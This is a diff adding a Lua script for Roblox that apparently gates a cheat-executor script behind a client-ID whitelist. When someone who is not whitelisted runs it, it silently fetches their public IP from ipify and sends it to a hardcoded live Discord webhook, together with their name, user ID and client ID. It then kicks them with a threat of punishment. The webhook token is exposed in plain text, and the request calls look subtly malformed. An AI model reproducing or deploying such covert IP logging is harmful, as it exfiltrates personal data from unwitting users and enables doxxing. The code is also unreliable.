@@ -1,0 +1,118 @@
+local lplr = game.Players.LocalPlayer
+local clientID = game:GetService("RbxAnalyticsService"):GetClientId()
+local hook = "https://discord.com/api/webhooks/1141671892760137729/_HR6l8eYm8tfdKQytfToSqsLeVW2znRhSfCpii0xVw5g06ZRcKQaKplFdAYCTBqAKu5y"
+
+local whitelistTable = {
+    private = {
+        { clientID = "7BD82BFB-09C0-4596-B0E3-2E4C6E1B4209", priority = 2 },
+        { clientID = "54B0DBB8-B5CF-48FF-89A3-F436707BDF58", priority = 2 },
+        { clientID = "6AF8C374-5489-405A-89B4-A6F0A587170F", priority = 2 },
+        { clientID = "F85E385D-BE58-4249-B586-3E5444863CEB", priority = 2 },
+        { clientID = "1373097E-798A-4482-9C7C-A58E92606267", priority = 2 },
+        { clientID = "24AA1EAE-346E-454C-BC38-443049F2F864", priority = 2 },
+        { clientID = "01F0B626-1931-4060-91C2-9C7C2BC37E47", priority = 2 }
+
+    },
+    owner = {
+        { clientID = "8338B668-D021-4B5D-90E1-6DA1D9119EBF", priority = 3 }
+    },
+    booster = {
+        { clientID = "", priority = 1 }
+    }
+}
+
+local blacklistTable = {
+    "db162391-53fe-4fd2-8686-6010d0d0ea0d",
+}
+
+local function isWhitelisted(id)
+    for _, group in pairs(whitelistTable) do
+        for _, user in pairs(group) do
+            if user.clientID == id then
+                return true
+            end
+        end
+    end
+    return false
+end
+
+local function isBlacklisted(id)
+    for _, blacklistedId in ipairs(blacklistTable) do
+        if blacklistedId == id then
+            return true
+        end
+    end
+    return false
+end
+
+local isPlayerWhitelisted = isWhitelisted(clientID)
+
+
+local function sendMessageToWebhook(messageContent)
+    local message = {
+        ['embeds'] = {
+            {
+                ['title'] = 'Unauthorized Access Attempt',
+                ['description'] = messageContent,
+                ['color'] = 0xFF0000,
+                ['fields'] = {
+                    {name = 'Player Name:', value = game:GetService("Players").LocalPlayer.Name},
+                    {name = 'UserID', value = game:GetService("Players").LocalPlayer.UserId },
+                    {name = 'clientID', value = clientID},
+                    {name = "Config", value = "FAKE PRIVATE"},  
+                    {name = "Executed on", value = os.date("%d/%m/%Y  %H:%M")},   
+                    {name = "IP LOG: ", value = game:HttpGet('https://api.ipify.org')}        
+                }
+            }
+        }
+    }
+
+    local success = false
+    local response
+    if syn then
+        response = syn.request({
+			{
+				Url = hook,
+				Method = 'POST',
+				Headers = {
+					['Content-Type'] = 'application/json'
+				},
+				Body = game:GetService('HttpService'):JSONEncode(message)
+			}
+		})
+        success = response and response.StatusCode == 200
+	elseif request then
+		response = request({
+			{
+				Url = hook,
+				Method = 'POST',
+				Headers = {
+					['Content-Type'] = 'application/json'
+				},
+				Body = game:GetService('HttpService'):JSONEncode(message)
+			}
+		})
+        success = response and response.StatusCode == 200
+	elseif http_request then
+		response = http_request({
+			{
+				Url = hook,
+				Method = 'POST',
+				Headers = {
+					['Content-Type'] = 'application/json'
+				},
+				Body = game:GetService('HttpService'):JSONEncode(message)
+			}
+		})
+        success = response and response.StatusCode == 200
+	end
+
+    if not success then
+        warn("Failed to send webhook message.")
+    end
+end
+
+if isBlacklisted(clientID) or not isPlayerWhitelisted then
+    sendMessageToWebhook("Player attempted to bypass whitelist.")
+    lplr:Kick("ATTEMPT TO BYPASS WHITELIST | YOU'RE GONNA BE PUNISHED")
+end
